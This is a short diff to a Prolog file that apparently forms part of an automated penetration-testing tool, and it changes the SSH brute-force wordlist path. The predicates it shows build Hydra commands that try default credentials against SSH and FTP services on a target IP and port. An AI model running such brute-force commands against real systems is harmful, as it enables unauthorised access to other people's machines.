@@ -79,7 +79,7 @@ profile(telnet_attack, [ipv4=Ip, uri_ipv4=Uri_ipv4, port=Port, uri_port=Uri_port
 
 
 ssh_attack(Parameters, Command) :- 
-	format_command("hydra -C wordlists/default_credentials/test.txt ssh://~w:~w", [Parameters.ipv4, Parameters.port], Command). 
+	format_command("hydra -C wordlists/default_credentials/ssh_pwd.txt ssh://~w:~w", [Parameters.ipv4, Parameters.port], Command). 
 
 ftp_attack(Parameters, Command) :- 
 	format_command("hydra -C wordlists/default_credentials/test.txt ftp://~w:~w", [Parameters.ipv4, Parameters.port], Command). 
